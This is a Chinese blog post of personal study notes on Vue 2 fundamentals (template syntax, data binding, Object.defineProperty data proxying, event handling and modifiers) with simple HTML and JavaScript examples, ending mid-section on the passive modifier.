---
title: 'Vue2基本使用'
date: 2022-7-25 20:30:40
cover: false
toc_number: false
tags:
- Vue2
categories: Vue
typora-root-url: Vue2基本使用
---



教程链接：https://www.bilibili.com/video/BV1Zy4y1K7SH



# 课程简介

`vue2 + vue3`

- `vue基础`
- `vue-cli`
- `vue-router`
- `vuex`
- `element-ui`
- `vue3`

# 1.`vue`核心

## 1.1.`vue`简介

### 1.1.1.`vue`官网使用指南

- 教程：https://cn.vuejs.org/v2/guide/
  - 入门教程

- `api`：https://cn.vuejs.org/v2/api/
  - api是在实际开发中，遇到问题去查阅时，逐渐熟悉的
- `vue`风格指南：https://cn.vuejs.org/v2/style-guide/

### 1.1.2.介绍与描述

基本概念：一套用于`构建用户界面`的`渐进式`Javascript框架

我的理解：

- 把数据给vue，vue给你界面
- 何谓渐进式：根据项目的复杂程度，引入不同的库（逐渐递进）
  - 简单应用：只需一个轻量小巧的核心库
  - 复杂应用：可以引入各式各样的`vue`插件

发展历史：

作者：`Evan You`

- 2013年，受到`Angular`框架的启发，尤雨溪开发出了一款轻量框架——`Seed`。同年12年，`Seed`更名为`Vue`，版本为0.6.0
- 2014年，`Vue`正式对外发布，版本号0.8.0。`Taylor otwell`在`Twitter`上发布动态，说自己正在学习`Vue.js`
- 2015年，10月27日，正式发布`Vue1.0.0 Evangelion`（新实际福音战士）
- 2016年，10月1日，正式发布`Vue2.0.0 Ghost in the shell`（攻壳机动队）
- 2020年，9月18日，正式发布`Vue3.0.0 One Piece`（海贼王）

我的理解：

- 后起之秀，生态完善，已成为国内前端工程师必备技能

### 1.1.3.`vue`的特点

- 采用组件化模式，提高代码复用率，且代码更好维护
- 声明式编码，让编码人员无需直接操作`DOM`，提高开发效率

### 1.1.4.搭建`vue`开发环境

- 直接下载并用 `<script>` 标签引入：

```html
<script src ="./js/vue.js"></script>
```

引入后，`Vue` 会被注册为一个全局变量，全局会多了一个`Vue`的构造函数。

可以在控制台输出

开发版本：https://cn.vuejs.org/js/vue.js

生产版本：https://cn.vuejs.org/js/vue.min.js



- 下载`vuedevtools`，可以搜索直接下载插件
- 修改`Vue.config`配置，关掉控制台关于生产环境的提示



`Vue.config.productionTip`，设置为 `false` 以阻止 vue 在启动时生成生产提示。

## 1.2.初识`vue`

### 1.2.1.`HelloWorld`小案例

- vue帮我们构建界面，界面放在哪个位置呢？

  - 需要准备一个容器（一个dom节点）

    ```html
    <div id="root">
        
    </div>
    ```

  - 容器内部不应该写任何东西

    - 但我们先写点东西在里面

      ```html	
      <div id="root">
          <h2>Hello World</h2>
      </div>
      ```

      

- 通过`new`调用全局的`Vue`构造函数，创建`Vue`的实例对象

  ```javascript
  // 创建Vue实例
  const x = new Vue()
  ```

- 创建`Vue`实例时，有个问题，需不需要传参数，传几个呢？

  - `Vue`的构造函数只接受一个参数，参数类型为对象
  - 这种对象，一般称为`配置对象`
    - `key`一般都是固定的

- `Vue`构造函数的的第一个配置：`el`，用于指定当前`Vue`实例为哪个容器服务

  - 值通常为`css选择器字符串`，`Vue`实例自己去找
  - 也可以通过`document.getElementById`找到后，再传给`Vue`实例

  ```javascript
  const x = new Vue({
  	el: "#root"
  })
  ```

  - 通过`el`配置，指定`id`为`root`的容器，被`Vue`实例管理
    - 我的理解：拿到`dom`节点对象传给`js`（`Vue`实例），后续数据渲染结果，都基于该`dom`节点对象
  - 此时`Vue`实例对象通过`el`管理容器后，但我们还没有用到`Vue`

- 需求：界面显示的`Hello`不变，但`World`是变化的

  - 我们把容器里面，变化的数据，交给`Vue`实例来保管

  - 只需要维护好数据，省去了自己操作`dom`

  - 使用`data`配置项，存储数据，供`el`指定的容器使用（容器外面使用，是没用的），值暂时写为一个对象

    ```
    // 存储用户自定义数据
    // 值暂时写为一个对象
    data: {
    	name : 'xiaoming',
    	age: 18
    }
    ```

  - 容器怎么拿到，存在`data`配置项里面的数据呢？

    - 使用`插值`语法：`{{name}}`

      ```html
      <body>
          <div id="root">
              <h2>Hello {{name}}</h2>
          </div>
      
          <script src ="./js/vue.js"></script>
          <script>
              Vue.config.productionTip = false
              new Vue({
                  el: "#root",
                  data: {
                      name: 'sai'
                  }
              })
          </script>
      </body>
      ```

      页面效果：

      ![image-20220402164107644](image-20220402164107644.png)

- 并不需要一个变量，来存储`Vue`实例对象，直接`new Vue()`即可

### 1.2.2.小结：分析`Helloworld`小案例

- 想让`Vue`工作，就必须创建一个`Vue`实例，且要传入一个配置对象
- `root`容器里面的代码依然符合`html`规范，只不过混入了一些特殊的`Vue`语法
- `root`容器里面的代码被称为`Vue模板`
  - 模板的解析流程：先有的容器，然后有`Vue`实例，当`Vue`实例开始工作时，读取`el`配置，拿到了容器
  - `Vue`实例开始解析包含`Vue`特殊语法的字符集，用`data`里的数据进行替换`Vue`设计的特殊语法
  - 最后生成全新的`id`为`root`的`html`片段，替换掉之前的容器，重新放到页面上
  - 容器的作用
    - 为`Vue`实例提供模板
    - 给`Vue`的解析结果提供一个呈现的位置
- 真实开发中只有一个`Vue`实例，并且会配合着组件一起使用
- 差值语法中要写`js`表达式，差值语法可以读取到`data`中的所有属性
- `data`中的数据发生变化时，所有用到这些数据的页面，也会全部更新
- 注意区分：`js`表达式和`js`代码（语句）
  - 表达式：一个表达式会生成一个值，可以放在任何一个需要值的地方
    - `a`
    - `a+b`
    - `demo(1)`
    - `x === y ? 'a' : 'b'`

  - `js`代码（语句）
    - `if(){}`
    - `for(){}`


## 1.3.模板语法

### 1.3.1.效果

差值语法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="../vue.js"></script>
</head>
<body>
    <div id="app">
        <h1>差值语法</h1>
        <h3>你好，{{name}}</h3>
    </div>

    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#app',
            data: {
                name: 'jack'
            }
        })
    </script>
</body>
</html>
```

![image-20220510213057593](image-20220510213057593.png)

指令语法

```html
        <h1>指令语法</h1>
        <a href="http://www.baidu.com">跳转</a>
```

![image-20220510213158109](image-20220510213158109.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="../vue.js"></script>
</head>
<body>
    <div id="app">
        <h1>指令语法</h1>
        <a :href="url">跳转</a>
    </div>

    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#app',
            data: {
                name: 'jack',
                url: 'http://www.baidu.com'
            }
        })
    </script>
</body>
</html>
```

当使用`v-bind`时，右边的代码会当做表达式来执行，`url`就表示了读取`url`变量值，可以简写成`:`

差值语法通常用来指定标签体内容

`v-bind`通常用来指定标签属性内容

### 1.3.2.小结：模板语法

- `vue`模板语法有两大类
  - 差值语法
    - 功能：用于解析标签体内容
    - 写法：`{{xxx}}`
      - `xxx`是`js`表达式，且可以直接读取到`data`中的所有属性
  - 指令语法
    - 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件...）
    - 举例：`v-bind:href="xxx"`或简写成`:href="xxx"`，`xxx`同样要写`js`表达式
      - 且可以直接读取到`data`中的所有属性
      - 备注：`vue`中有很多的指令，且形式都是：`v-???`，此时我们只是拿`v-bind`举个例子

## 1.4.数据绑定

`vue`中有2种数据绑定的方法

- 单向数据绑定（`v-bind`）：数据只能从`data`流向页面
- 双向绑定（`v-bind`）：数据不仅能从`data`流向页面，还可以从页面流向`data`
  - 双向绑定一般都应用在表单类元素（输入类元素）上，如`input`、`select`
  - `v-model:value`，可以简写成`v-model`，因为默认收集的就是`value`

## 1.5.`el`与`data`的两种写法

`vue`实例上，带`$`符号的属性都是给开发者用的，并且实例的原型对象上，也有一堆可以使用的方法

![image-20220511065626334](image-20220511065626334.png)

### 1.5.1.`el`的`$mount`写法

我们可以用原型对象上的`$mount`来指定容器

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
</head>
<body>
<div id="app">
    <h2>{{message}}</h2>
</div>
<script>
    const app = new Vue({
        data: {
            message: 'Hello'
        }
    })
    app.$mount('#app') // 指定容器
    
    console.log(app)

</script>
</body>
</html>
```

![image-20220511065934258](image-20220511065934258.png)



### 1.5.2.`data`的函数式写法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
</head>
<body>
<div id="app">
    <h2>{{message}}</h2>
</div>
<script>
    const app = new Vue({
        data: function () { // data的第二种写法
            console.log('data中的this', this) // data中的this指向，是vue实例对象
            return {
                message: 'Hello'
            }
        }
    })
    app.$mount('#app')


</script>
</body>
</html>
```

![image-20220511070401093](image-20220511070401093.png)

注意如果`data`的函数的写法，不能写成箭头函数，否则`this`指向`window`，`Vue`实例是在`window`下的

箭头函数没有自己的`this`，会往外找

```js
    const app = new Vue({
        data: () => { // data的第二种写法
            console.log('写成箭头函数式，data中的this', this)
            return {
                message: 'Hello'
            }
        }
    })
    app.$mount('#app')
```

![image-20220511070615989](image-20220511070615989.png)

普通函数的简写：

```js
    const app = new Vue({
        data() { 
            return {
                message: 'Hello'
            }
        }
    })
    app.$mount('#app')

```

### 1.5.3.小结：`el`与`data`的两种写法

`data`与`el`的两种写法

- `el`有两种写法
  - `new Vue()`是写在配置对象的`el`属性中
  - 拿到`Vue`实例，通过原型对象的`$mount`指定：`vm.$mount('#app')`
- `data`有两种写法
  - 对象式
  - 函数式
    - 学习组件时，必须使用函数式，否则不同组件的`data`数据会共享
    - 由`Vue`实例管理的函数，一定不要写成箭头函数，否则`this`就不再指向`Vue`实例了

## 1.6.理解`MVVM`

### 1.6.1.`MVVM`

`MVVM`并不是`vue`独有的，这是一种设计思想

- `M`，模型`Model`：对应`data`中的数据
- `V`，视图`View`：模板
- `VM`，视图模型`ViewModel`：`Vue`实例对象

![image-20220511071550941](image-20220511071550941.png)



前端框架设计的主流思想就是

- 准备好数据，写好模板代码，然后让框架开始工作，就可以让数据和模板建立起连接

- 并且框架会保证，数据不管怎么变，模板对应的页面都会自动更新

### 1.6.2.模板语法补充

注意观察`vm`，写在`data`中的数据，最终是出现在了`vm`上

![image-20220511092337716](image-20220511092337716.png)

这里`(...)`表示经过了数据代理，后面会讲到，鼠标点击即可查看具体内容

插值语法`{{xxx}}`还可以写什么呢？

- 只要是`vm`身上有的属性，都可以写

  ```html
      <h2>{{message}}</h2>
      <h2>{{$options}}</h2>
      <h2>{{$emit}}</h2>
      <h2>{{_c}}</h2>
  ```

- 所以插值语法的`xxx`并不是只可以写`data`里面的值，是`data`里的值最终到了`vm`实例对象上，只要是实例对象的属性，插值语法就都可以写

### 1.6.3.小结：`MVVM`

`MVVM`并不是`vue`独有的，这是一种设计思想

- `M`，模型`Model`：对应`data`中的数据
- `V`，视图`View`：模板
- `VM`，视图模型`ViewModel`：`Vue`实例对象

观察发现：

- `data`中的所有属性，最后都出现在`vm`身上
- `vm`身上的所有属性，及`Vue`实例的原型对象上的所有属性，在`Vue`模板中都可以直接使用

## 1.7.数据代理

### 1.7.1.`Object.defineProperty`

功能：给对象添加属性用的

```js
		let person = {
			name: '张三',
			sex: '男'
		}
		
		Object.defineProperty(person, 'age', {
			value: 18
		})
		console.log(person)
```

此时`person`对象上，就有了`age`属性：

![image-20220511093651529](image-20220511093651529.png)

#### 可枚举配置项

那么为什么不直接添加`age`属性呢咧？

仔细看（用谷歌浏览器看，之前的都是用的`edge`李浏览器）：

![image-20220511094735871](image-20220511094735871.png)

`age`的颜色，浏览器用另外一种颜色区分了，表示`age`属性是不参与遍历的（不可被枚举的）

使用`Object.keys`、`for`循环都是遍历不到的

```js
		let person = {
			name: '张三',
			sex: '男'
		}
		
		Object.defineProperty(person, 'age', {
			value: 18
		})
		
		console.log(Object.keys(person))
		
		for(let key in person) {
			console.log('for:', key)
		}
		console.log(person)
```

![image-20220511094244374](image-20220511094244374.png)

定义时，可以使用配置项`enumerable`，控制其属性是否可以枚举，默认值是`false`

```js
		Object.defineProperty(person, 'age', {
			value: 18,
			enumerable: true // 设置新增的属性是可枚举的
		})
```

重新打印输出下，`age`的颜色已经恢复正常，表示是可以枚举的了：

![image-20220511094504645](image-20220511094504645.png)

#### 可修改配置项

但是我们修改`person.age = 19`后重新打印下`person`，发现`age`并没有变化

![image-20220511095028367](image-20220511095028367.png)

使用配置项`writable`使新增的`age`属性可以修改：

```js
		Object.defineProperty(person, 'age', {
			value: 18,
			enumerable: true,
            writable: true // 控制属性是否可以被修改，其默认值是false
		})
```

`age`的值已经可以修改了：

![image-20220511095219920](image-20220511095219920.png)

#### 可删除配置项

我们删除下`age`属性，发现删除不了：

![image-20220511095425289](image-20220511095425289.png)

使用配置项`configurable`使新增的`age`属性可以删除：

```js
		Object.defineProperty(person, 'age', {
			value: 18,
			enumerable: true,
            writable: true,
            configurable: true // 控制属性是否可以被删除，其默认值是false
		})
```

现在就可以删除`age`属性了

![image-20220511095617387](image-20220511095617387.png)

所以，使用`Object.defineProperty`可以对追加的属性，进行更多高级的限制

#### 新场景需求

假设`age`依赖于`num`

```js
		let num = 18
		let person = {
			name: '张三',
			sex: '男',
			age: num
		}
		
		console.log(person)
```

后期`num`变化的时候，我们希望`person`也跟着改变

但目前是没有的

![image-20220511100438806](image-20220511100438806.png)

因为代码执行过一遍之后，是不会再重新执行的

除非你这样手动再赋值一下：

![image-20220511100612905](image-20220511100612905.png)

但我们希望这一过程是`自动`的，引入下一小节

#### `get()`配置项

当有人读取`person`的`age`属性时，`get`函数`(getter)`就会被调用，且返回值就是`age`的值

```js
		let num = 19
		let person = {
			name: '张三',
			sex: '男',
		}
		
		
		Object.defineProperty(person, 'age', {
			get: function() {
				return 'Hello'
			}
		})
		

		console.log(person)
```

`person`对象：

![image-20220511101719045](image-20220511101719045.png)

此时`person`对象上有`age`属性了，还有一个为`age`属性服务的`getter`函数

当鼠标悬浮在`(...)`上时，提示`invoke property getter`，中文翻译表示`调用属性 gettter`，意思就是说`age`的值，调用了`getter`这个属性

![image-20220511101913655](image-20220511101913655.png)

要想看`age`的值，必须用鼠标点一下`(...)`，当我们点这么一下的时候，会触发`getter`函数的调用

![image-20220511102035690](image-20220511102035690.png)

此时我们可以完善一下，上一小节的需求，这里`return`的就是`num`变量：

```js
		let num = 19
		let person = {
			name: '张三',
			sex: '男',
		}
		
		
		Object.defineProperty(person, 'age', {
			get: function() {
				return num
			}
		})
		

		console.log(person)
```

![image-20220511102321520](image-20220511102321520.png)

此时修改`num`的值之后，再次访问`person`对象时，会调用`age`的`getter`，此时拿到的就是`num`更新后的值

所以`getter`函数的返回值，一般是写新增属性依赖的其他变量

简写：

```js
		Object.defineProperty(person, 'age', {
			get() {
				return num
			}
		})
		
```



#### `set()`配置项

当有人修改`person`的`age`属性时，`set`函数`(setter)`就会被调用，且会收到修改的具体值

```js
		let num = 18
		let person = {
			name: '张三',
			sex: '男',
		}
		
		
		Object.defineProperty(person, 'age', {
			get() {
				console.log('有人读取age属性了')
				return num
			},
			set(value) {
				console.log('有人修改age属性了，且值为：',value)
			}
		})
		
		console.log(person)
```

![image-20220511103510715](image-20220511103510715.png)

此时我们修改`age`的属性值，`setter`函数被调用了，我们也拿到了修改的值

但`person`的`age`并没有变化，我们只需要将修改的`value`赋值给`num`即可

```js
		Object.defineProperty(person, 'age', {
			get() {
				console.log('有人读取age属性了')
				return num
			},
			set(value) {
				console.log('有人修改age属性了，且值为：',value)
				num = value // 将修改后的值，赋值给num
			}
		})
```



![image-20220511103721063](image-20220511103721063.png)

我们将修改后的值赋值给`num`后，下次再读取`age`的属性时，就会调用`getter`获得最新的值



变量`number`和对象`person`是两个东西，通过`defineProperty`将这两者关联起来

#### 理解数据代理

 通过一个对象代理对另一个对象中属性的操作（读/写）

- 有一个对象`obj`，它有一个属性`x`，`obj`自身对`x`可以进行任务操作
- 但我希望，可以通过另一个对象`obj2`来修改`obj`中的`x`属性

实现一个最简单的数据代理：

```js
		let obj = {x: 200}
		let obj2 = {y: 200}
		
		Object.defineProperty(obj2, 'x', {
			get() {
				return obj.x
			},
			set(value)  {
				obj.x = value
			}
		})
```

这样`obj2`就对`obj`的`x`属性实现了代理，可以通过`obj2`来读写`obj`上的`x`属性

![image-20220511105253154](image-20220511105253154.png)

#### `Vue`中的数据代理

如图可以看到，`vue`实例上，有`data`里面的值，就是通过数据代理得到的

![image-20220511110026218](image-20220511110026218.png)

现在我们来验证一下

验证`getter`:

控制台打印`vm.name`，输出的就是定义的`data`里面的结果，说明`getter`是通的

验证`setter`：

有一点已经明确的是，`vm`实例对象上，肯定有一个地方存着`data`属性的值，不然`getter/setter`的时候没地方去操作，这个属性值是`vm._data`。现在要做的是，就是证明`vm`实例上的`_data`，就是我们自己定义的`data`

将`data`抽离出来，这样我们在操作完`vm._data`后，也可以看到自己定义的`data`有没有变了

```js
	let data = {
		name: 'sai',
		address: 'beijing'
	}
    const vm = new Vue({
        data
    })
    vm.$mount('#app')
    console.log(vm)
```

![image-20220511142145893](image-20220511142145893.png)

结果发现，我们修改`vm`实例上的`_data`后，和自定义`data`比较后，是相等的。说明自定义`data`也变化了，至此，`setter`也通了

### 1.7.2.小结：数据代理

![image-20220511143124575](image-20220511143124575.png)

- `Vue`中的数据代理
  - 通过`vm`对象来代理`data`对象中的属性的操作（读/写）
- `Vue`中数据代理的好处
  - 更加方便的操作`data`中的数据
- 基本原理
  - 通过`Object.defineProperty()`把`data`对象中所有属性添加到`vm`上
  - 为每一个添加到`vm`上的属性，都指定一个`getter/setter`
  - 在`getter/setter`内部去操作（读/写）`data`中对应的属性

### 1.7.3.小问题

我们仔细观察下`vm._data`

![image-20220511144111549](image-20220511144111549.png)

的确，它就是我们自定义的`data`

但是咧，`vue`还帮我们做了数据劫持，因为当`vm._data = 'modify'`时，`vue`还要去更新页面，所以要能够监听到`_data`的变化

关于数据劫持，后面会详细说明

## 1.8.事件处理

### 1.8.1.`methods`属性配置回调函数

容器上事件的回调函数，应该写在`vue`实例对象的配置对象里，否则会报错

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Title</title>
		<script src="js/vue.js"></script>
	</head>
	<body>
		<div id="app">
			<h2>{{name}}</h2>
			<button v-on:click="showInfo">点我提示信息</button>
		</div>
		
		<script>
			Vue.config.productionTip = false

			function showInfo() { // 事件的回调定义在vue实例外部
				alert('Hello')
			} 
			
			const vm = new Vue({
				data: {
					name: 'sai',
					address: 'beijing'
				}
			})
			
			vm.$mount('#app')
			console.log(vm)
		</script>
	</body>
</html>

```

报错信息：

![image-20220511145422711](image-20220511145422711.png)

通过`methods`属性，配置事件的回调：

```js
			const vm = new Vue({
				data: {
					name: 'sai',
					address: 'beijing'
				},
				methods: {
					showInfo() { // 对象里配方法，直接 方法名(){} 即可
						alert('Hello')
					}
				}
			})
```

效果：

![image-20220511145835103](image-20220511145835103.png)

### 1.8.2.回调函数的参数

默认第一个参数，是`event`对象，原生点击事件就有

```js
				methods: {
					showInfo(a, b, c, d) {
						console.log(a, b, c, d)
					}
				}
```

![image-20220511150054804](image-20220511150054804.png)

一般用`event`表示：

```js
				methods: {
					showInfo(event) {
						console.log(event)
					}
				}
```

### 1.8.3.回调函数中的`this`指向

#### `this`指向`vm`

`methods`配置项里，定义的回调函数如果写的是正常的函数，`this`指向`vue`实例对象

```js
				methods: {
					showInfo() {
						console.log('我是this:', this)
						console.log('我是vm:', vm)
						console.log(this === vm)
					}
				}
```

![image-20220511150713286](image-20220511150713286.png)

注意：`showInfo`是点击事件对应的回调，`vue`实例已经创建了，所以可以拿到`vm`

#### `this`不指向`vm`

- 如果回调函数写成了箭头函数，`this`会向外找，指向`window`，因为箭头函数没有自己的`this`指向

  ```js
  				methods: {
  					showInfo: () => {
  						console.log('我是this:', this)
  						console.log('我是vm:', vm)
  						console.log(this === vm)
  					}
  				},
  ```

  ![image-20220511151329441](image-20220511151329441.png)

  所以，所有被`vue`实例管理的函数，最好都写成普通函数，不要写成箭头函数

- 如果回调函数内部还嵌套了函数，则内部的函数中`this`的指向，也指向`window`

  ```js
  				methods: {
  					showInfo(){
  						function inner() {
  							console.log('我是回调函数嵌套函数内部的this:', this)
  							console.log(this === vm)
  						}
  						inner()
  					}
  				},
  ```

  ![image-20220511152227088](image-20220511152227088.png)

  一般我们会定义一个变量，先存储`this`，然后在内部函数中使用这个变量，这样在内部函数中，就可以获取到`vm`了

  ```js
  				methods: {
  					showInfo(){
  						const self = this
  						function inner() {
  							console.log('我是回调函数嵌套函数内部的self:', self)
  							console.log(self === vm)
  						}
  						inner()
  					}
  				},
  ```

  

  ![image-20220511152430482](image-20220511152430482.png)

### 1.8.4.`v-on`的简写

`v-on:click="showInfo"`等价于`@click="showInfo"`

### 1.8.5.点击事件中回调函数的传参

#### 传递参数的基本语法

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Title</title>
		<script src="js/vue.js"></script>
	</head>
	<body>
		<div id="app">
			<h2>{{name}}</h2>
			<button v-on:click="showInfo(666)">点我提示信息</button> // 页面传递参数
		</div>

		<script>
			Vue.config.productionTip = false

			const vm = new Vue({
				data: {
					name: 'sai',
					address: 'beijing'
				},
				methods: {
					showInfo(value){ // 回调函数接收参数
						console.log(value)
					}
				},
			})

			vm.$mount('#app')
		</script>
	</body>
</html>

```

效果：

![image-20220511152959746](image-20220511152959746.png)

#### `event`对象丢失的解决办法

我们多接收几个参数：

```js
				methods: {
					showInfo(value,a,b,c,d){
						console.log(value,a,b,c,d)
					}
				},
```

![image-20220511153131660](image-20220511153131660.png)

发现`event`并没有获取到

`vue`约定，在页面传参数时，默认在最后一个参数传入关键词`$event`，就可以获取到`event`对象了

并且在回调函数中，`event`参数是紧跟在自定义参数后面的，和怎么写无关：

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Title</title>
		<script src="js/vue.js"></script>
	</head>
	<body>
		<div id="app">
			<h2>{{name}}</h2>
			<button v-on:click="showInfo(666, $event)">点我提示信息</button> // 传入关键词$event，就可以在回调函数中获取到event对象
		</div>

		<script>
			Vue.config.productionTip = false

			const vm = new Vue({
				data: {
					name: 'sai',
					address: 'beijing'
				},
				methods: {
					showInfo(value,a,b,c,d,$event){
						console.log(value,a,b,c,d,$event) // 我想要$event在最后打印，实际上参数a的位置最终打印了event对象，event的顺序和页面定义时传的顺序一致
					}
				},
			})

			vm.$mount('#app')
		</script>
	</body>
</html>

```

效果：

![image-20220511153515558](image-20220511153515558.png)

#### 回调函数的几种写法

- `@click="showInfo"`

  - 当没有括号，回调函数指定`$event`形参时，打印结果是`event`对象

    ```js
    showInfo($event){
        console.log($event) // event对象
    }
    ```

    ![image-20220511155011362](image-20220511155011362.png)

- `@click="showInfo()"`

  - 当有括号但没有传递实参，回调函数指定`$event`形参时，打印结果是`undefined`

    ```js
    showInfo($event){
        console.log($event) // undefined
    }
    ```

    ![image-20220511155142176](image-20220511155142176.png)

- `@click="showInfo($event)"`

  - 当有括号且显示指定`$event`实参，回调函数指定`$event`形参时，打印结果是`event`对象

    ```js
    showInfo($event){
        console.log($event) // event对象
    }
    ```

    ![image-20220511155823472](image-20220511155823472.png)

- `@click="showInfo(666)"`

  - 当有括号且指定其他实参，并没有指定`$event实参`，回调函数的形参除了匹配实参还额外指定`$event`形参时，`event`对象会丢失

    ```js
    showInfo(value, $event){
        console.log(value, $event) // 666 undefined
    }
    ```

    ![image-20220511155954592](image-20220511155954592.png)

- `@click=showInfo(666, $event)`

  - 当有括号且指定其他实参，并显示指定`$event`实参，回调函数匹配形参时，可以打印出`event`对象

    ```js
    showInfo(value, $event){
        console.log(value, $event) // 666 event对象
    }
    ```

    ![image-20220511160133534](image-20220511160133534.png)

#### 回调函数挂载在`vm`实例对象上

如图可以看到，回调函数也是在`vm`上的

![image-20220511154034219](image-20220511154034219.png)

不要自作聪明，在`data`配置项中去写函数，那样的话，`vue`会给函数写设置数据劫持和数据代理，没有必要

如下是错误的：

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Title</title>
		<script src="js/vue.js"></script>
	</head>
	<body>
		<div id="app">
			<h2>{{name}}</h2>
			<button v-on:click="showInfo(666, $event)">点我提示信息</button>
		</div>

		<script>
			Vue.config.productionTip = false

			const vm = new Vue({
				data: {
					name: 'sai',
					address: 'beijing',
					showInfo(value, $event){
						console.log(value, $event)
					}
				},
			})

			vm.$mount('#app')
		</script>
	</body>
</html>

```

![image-20220511154307480](image-20220511154307480.png)

![image-20220511154325630](image-20220511154325630.png)

### 1.8.6.小结：事件处理

事件的基本使用

- 使用`v-on:xxx`或`@xxx`绑定事件，其中`xxx`为事件名
- 事件的回调需要配置在`methods`对象中，最终在`vm`上
- `methods`中配置的函数，不要用箭头函数，否则`this`的指向就不是`vm`了
- `methods`中配置的函数，都是被`vue`所管理的函数，`this`指向`vm`或组件实例对象
- `@click="demo"`和`@click="demo($event)"`效果一致，但后者可以传参

## 1.9.事件修饰符

### 1.9.1.`prevent`

阻止绑定事件的标签上的默认事件

存在默认事件的标签：

- `<a href="http://www.baidu.com"></a>`：默认事件为跳转链接

  ```html
  <!DOCTYPE html>
  <html lang="en">
  	<head>
  		<meta charset="UTF-8">
  		<title>Title</title>
  		<script src="js/vue.js"></script>
  	</head>
  	<body>
  		<div id="app">
  			<h2>{{name}}</h2>
  			<a href="http://www.baidu.com" @click="showInfo">点击提示信息</a>
  		</div>
  
  		<script>
  			Vue.config.productionTip = false
  
  			const vm = new Vue({
  				el: '#app',
  				data: {
  					name: 'sai',
  				},
  				methods: {
  					showInfo(){
  						alert('hello')
  					}
  				}
  			})
  
  		</script>
  	</body>
  </html>
  
  ```

  给`a`标签绑定点击事件，页面点击时，除了会调用回调函数（打印`hello`），还会跳转链接（跳转到`baidu`）

  为了阻止`a`标签点击事件的默认行为，可以调用点击事件`event`对象的`preventDefault`方法：

  ```js
  					showInfo(e){
  						e.preventDefault() // 阻止a标签点击事件的默认（跳转）行为
  						alert('hello')
  					}
  ```

  语法糖：

  ```html
  			<a href="http://www.baidu.com" @click.prevent="showInfo">点击提示信息</a>
  ```

  

### 1.9.2.`stop`

阻止事件冒泡

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Title</title>
		<script src="js/vue.js"></script>
		<style>
			.demo {
				width: 100%;
				height: 100px;
				background-color: #b3d4fc;
			}
		</style>
	</head>
	<body>
	<div id="app">
		<h2>{{name}}</h2>
		<div class="demo" @click="showInfo">
			<button @click="showInfo">点击</button>
		</div>
	</div>

		<script>
			Vue.config.productionTip = false

			const vm = new Vue({
				el: '#app',
				data: {
					name: 'sai',
				},
				methods: {
					showInfo(e){
						alert('hello')
					}
				}
			})

		</script>
	</body>
</html>

```

由于事件冒泡，`click`事件的回调函数被执行了两次

阻止事件冒泡：

```js
					showInfo(e){
						e.stopPropagation()
						alert('hello')
					}
```

语法糖：

```html
		<div class="demo" @click="showInfo">
			<button @click.stop="showInfo">点击</button>
		</div>
```



### 1.9.3.`once`

事件只触发一次

```js
		<button @click.once="showInfo">click</button>
```

页面只会打印一次，第二次以后单击事件就不会调用回调函数了

### 1.9.4.`capture`

使用事件的捕获模式

事件的处理默认是在冒泡阶段：

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Title</title>
		<script src="js/vue.js"></script>
		<style>
			.box1 {
				width: 100%;
				height: 100px;
				background-color: #b3d4fc;
			}
			.box2 {
				width: 100%;
				height: 50px;
				background-color: #e5a4a4;
			}
		</style>
	</head>
	<body>
	<div id="app">
		<h2>{{name}}</h2>
		<div class="box1" @click="showInfo(1)">div1
			<div class="box2" @click="showInfo(2)">div2</div>
		</div>
	</div>

		<script>
			Vue.config.productionTip = false

			const vm = new Vue({
				el: '#app',
				data: {
					name: 'sai',
				},
				methods: {
					showInfo(value){
						console.log(value)
					}
				}
			})

		</script>
	</body>
</html>

```

点击`div2`时，按照冒泡机制，先输出的是`2`：

![image-20220512184859659](image-20220512184859659.png)

我现在希望，按照捕获机制处理事件的回调：

```html
		<div class="box1" @click.capture="showInfo(1)">div1
			<div class="box2" @click="showInfo(2)">div2</div>
		</div>
```

点击`div2`，打印如下：

![image-20220512185002526](image-20220512185002526.png)

### 1.9.5.`self`

只有`event.target`是当前操作的元素时才触发事件

我们先打印下冒泡时的`e.target`，操作点击的是`button`，打印的就是`button`元素

```html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Title</title>
		<script src="js/vue.js"></script>
		<style>
			.box1 {
				width: 100%;
				height: 100px;
				background-color: #b3d4fc;
			}

		</style>
	</head>
	<body>
	<div id="app">
		<h2>{{name}}</h2>
		<div class="box1" @click="showInfo">
			<button @click="showInfo">click</button>
		</div>
	</div>

		<script>
			Vue.config.productionTip = false

			const vm = new Vue({
				el: '#app',
				data: {
					name: 'sai',
				},
				methods: {
					showInfo(e){
						console.log(e.target)
					}
				}
			})

		</script>
	</body>
</html>

```

由于事件冒泡，会打印两次

![image-20220512185908499](image-20220512185908499.png)

现在给外层元素加上`.self`事件修饰符

```html
		<div class="box1" @click.self="showInfo">
			<button @click="showInfo">click</button>
		</div>
```

点击`button`的打印结果：

![image-20220512190141765](image-20220512190141765.png)

由于`event.target`是`button`，所以绑定在`div`的事件不会被执行

### 1.9.6.`passive	`

事件的默认行为立即执行，无需等待事件回调执行完毕

先给`ul`绑定`scroll`滚动条滚动事件，经观察，滚轮每使滚动条滚动一下，回调函数会调用`9`次，经验证是滚动条走了9个像素（不同的浏览器走的像素值不一样，`edge`走了9像素，`chrome`走了12个像素）

`ul`获得焦点后，`scroll`事件可以使用小键盘的上下键来控制

`scroll`事件滚动条一旦到了末端，再按滚轮时，对应的事件回调不再触发

```html
